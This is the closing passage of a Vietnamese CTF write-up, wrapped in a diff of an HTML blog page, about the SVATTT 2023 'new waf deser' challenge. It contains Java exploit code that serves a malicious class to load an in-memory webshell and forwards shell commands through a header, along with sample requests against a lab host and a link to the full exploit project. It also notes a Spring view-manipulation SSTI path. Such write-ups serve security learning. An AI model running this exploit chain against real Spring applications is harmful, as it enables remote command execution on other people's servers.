+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (Exception e) {}
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>RequestMapping tương ứng:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// callback</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@RequestMapping</span>(<span style="color:#e6db74">&#34;/proxy/MemTemplatesImpl&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@ResponseBody</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> ByteArrayResource <span style="color:#a6e22e">proxy</span>() <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;Received callback request: /proxy/MemTemplatesImpl&#34;</span>);
+</span></span><span style="display:flex;"><span>        Path path <span style="color:#f92672">=</span> Paths.<span style="color:#a6e22e">get</span>(getClass().<span style="color:#a6e22e">getResource</span>(<span style="color:#e6db74">&#34;/evil/MemTemplatesImpl.class&#34;</span>).<span style="color:#a6e22e">toURI</span>());
+</span></span><span style="display:flex;"><span>        ByteArrayResource resource <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayResource(Files.<span style="color:#a6e22e">readAllBytes</span>(path));
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> resource;
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>Sau khi load thì code tiếp route redirect đến mem:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// run memshell from front</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@RequestMapping</span>(<span style="color:#e6db74">&#34;/memshell&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@ResponseBody</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">proxy</span>(<span style="color:#a6e22e">@RequestHeader</span>(<span style="color:#e6db74">&#34;cmd4f&#34;</span>) String cmd4f, HttpServletResponse httpServletResponse) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        String exploitBackendURL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://back/a/ayooo?devme_63hdsbx=&#34;</span> <span style="color:#f92672">+</span> URLEncoder.<span style="color:#a6e22e">encode</span>(cmd4f, <span style="color:#e6db74">&#34;utf-8&#34;</span>);
+</span></span><span style="display:flex;"><span>        httpServletResponse.<span style="color:#a6e22e">setHeader</span>(<span style="color:#e6db74">&#34;Location&#34;</span>, exploitBackendURL);
+</span></span><span style="display:flex;"><span>        httpServletResponse.<span style="color:#a6e22e">setStatus</span>(301);
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p><strong>Request</strong>: <code>http://ubuntu.lab:8004/http://10.1.xx.93:8082/tiktikboom</code>
+<strong>HttpServer Log</strong>:
+<img src="/images/2023/SVATTT-2023_new-waf-deser/HttpServerLog.png" alt="HttpServerLog"></p>
+<p><strong>Request</strong>:</p>
+<pre tabindex="0"><code>GET http://ubuntu.lab:8004/http://10.1.xx.93:8082/memshell
+User-Agent: 123
+cmd4f: ls
+</code></pre><p><strong>Response</strong>:
+<img src="/images/2023/SVATTT-2023_new-waf-deser/req_exploit.png" alt="req_exploit"></p>
+<p>Full project để exploit mình có push lên tại đây:  <a href="https://github.com/devme4f/SVATTT-2023_web02">https://github.com/devme4f/SVATTT-2023_web02</a></p>
+<h2 id="anotherway-spring-view-manipulation-ssti-still-via-deser">Anotherway: Spring View Manipulation (SSTI) still, via deser</h2>
+<p>Nếu cứ chăm chăm phần deser có khi mọi người cũng dễ miss bug này. Vì chưa có thời gian nên chưa poc lại. Có thể thấy là <code>back</code> dùng <code>thymleaf</code>:
+<img src="/images/2023/SVATTT-2023_new-waf-deser/pom_xml.png" alt="pom_xml"></p>
+<p>Sau khi deser thành class <code>User</code> thì <code>role</code> được nối thẳng vào return String của <code>RequestMapping</code>:
+<img src="/images/2023/SVATTT-2023_new-waf-deser/ssti_spring.png" alt="ssti_spring"></p>
+<p>==&gt; <strong>Spring View Manipulation</strong></p>
+
+    </div>
+  </article>
+
+  
+  
+
+
+
+
+
+
+  <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/posts">Archives</a></li>
+         
+          <li><a href="/tags">Tags</a></li>
+         
+          <li><a href="/about">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    <div id="toc-footer" style="display: none">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#preface">Preface</a></li>
+    <li><a href="#docker-composeyml">docker-compose.yml</a></li>
+    <li><a href="#de-old-backend">de old backend</a></li>
+    <li><a href="#de-front">de front</a></li>
+    <li><a href="#deser">deser</a></li>
+    <li><a href="#anotherway-spring-view-manipulation-ssti-still-via-deser">Anotherway: Spring View Manipulation (SSTI) still, via deser</a></li>
+  </ul>
+</nav>
+    </div>
+    
+
+    <div id="share-footer" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsvattt-2023_new-waf-deser%2f" aria-label="Facebook">
+      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsvattt-2023_new-waf-deser%2f&text=SVATTT-2023%20Ctf%20Writeup%20-%20The%20new%20Waf%20Deser" aria-label="Twitter">
+      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsvattt-2023_new-waf-deser%2f&title=SVATTT-2023%20Ctf%20Writeup%20-%20The%20new%20Waf%20Deser" aria-label="Linkedin">
+      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsvattt-2023_new-waf-deser%2f&is_video=false&description=SVATTT-2023%20Ctf%20Writeup%20-%20The%20new%20Waf%20Deser" aria-label="Pinterest">
+      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=SVATTT-2023%20Ctf%20Writeup%20-%20The%20new%20Waf%20Deser&body=Check out this article: https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsvattt-2023_new-waf-deser%2f" aria-label="Email">
+      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsvattt-2023_new-waf-deser%2f&title=SVATTT-2023%20Ctf%20Writeup%20-%20The%20new%20Waf%20Deser" aria-label="Pocket">
+      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsvattt-2023_new-waf-deser%2f&title=SVATTT-2023%20Ctf%20Writeup%20-%20The%20new%20Waf%20Deser" aria-label="reddit">
+      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsvattt-2023_new-waf-deser%2f&name=SVATTT-2023%20Ctf%20Writeup%20-%20The%20new%20Waf%20Deser&description=Preface%20G%c3%b5%20ph%c3%adm%20vi%e1%ba%bft%20b%c3%a0i%20n%c3%a0y%20th%c3%ac%20c%c5%a9ng%20%c4%91%c3%a3%20g%e1%ba%a7n%202%20th%c3%a1ng%20k%e1%bb%83%20t%e1%bb%ab%20%c4%91%e1%bb%a3t%20final%20A%26amp%3bD%20SVATTT%202023%20k%e1%ba%bft%20th%c3%bac.%20N%c4%83m%20nay%20m%c3%acnh%20may%20may%20m%e1%ba%afn%20%c4%91%c6%b0%e1%bb%a3c%20v%c3%a0o%20chung%20kh%e1%ba%a3o%20ch%c6%a1i%20A%26amp%3bD%20v%c3%a0%20v%e1%bb%9bi%20role%20l%c3%a0%20defense%20%28c%e1%ba%a5u%20h%c3%acnh%20log%2c%20patch%20bug%2c..etc%29.%20V%c3%a0o%20thi%20th%c3%ac%20kh%c3%a1%20lo%e1%ba%a1n%20%2b%20nhi%e1%bb%81u%20vi%e1%bb%87c%2c%20v%c3%a0%20v%c3%ac%20m%c3%acnh%20role%20defense%20n%c3%aan%20c%c5%a9ng%20ch%e1%bb%89%20ng%c3%b3%20qua%20b%c3%a0i%20n%c3%a0y%20v%c3%a0%20th%e1%ba%a5y%20backend%20y%20chang%20b%c3%a0i%20waf-deser%20n%c4%83m%20tr%c6%b0%e1%bb%9bc%20kh%c3%a1c%20m%e1%bb%97i%20ph%e1%ba%a7n%20front-end%2c%20t%c6%b0%e1%bb%9fng%20d%e1%bb%85%20n%c3%aan%20m%c3%acnh%20v%e1%ba%abn%20ch%c6%b0a%20m%c3%b2%20l%e1%ba%a1i%20xem%2c%20nay%20%c4%91%e1%ba%bfn%20deadline%20ho%c3%a0n%20th%c3%a0nh%20task%20%e1%bb%9f%20clb%20m%e1%bb%9bi%20l%e1%bb%a5i%20c%e1%bb%a5i%20l%c3%a0m%2c%20th%e1%ba%a5y%20hay%20n%c3%aan%20write%20up%20l%e1%ba%a1i%20lu%c3%b4n%2c%20coi%20nh%c6%b0%20l%c3%a0m%20t%c3%a0i%20li%e1%bb%87u%20tham%20kh%e1%ba%a3o%20cho%20c%c3%a1c%20n%c4%83m%20sau%20%3aD" aria-label="Tumblr">
+      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsvattt-2023_new-waf-deser%2f&t=SVATTT-2023%20Ctf%20Writeup%20-%20The%20new%20Waf%20Deser" aria-label="Hacker News">
+      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      
+        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
+          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
+          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
+          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+
+  <footer id="footer">
+  <div class="footer-left">
+    Copyright  &copy; 2024  devme4f blogs 
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/posts">Archives</a></li>
+         
+        <li><a href="/tags">Tags</a></li>
+         
+        <li><a href="/about">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+  </div>
+</body>
+
+<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
+<script src=/lib/jquery/jquery.min.js></script>
+<script src=/js/main.js></script>
+
+<script src=/js/code-copy.js></script>
+
+
+
+
+</html>
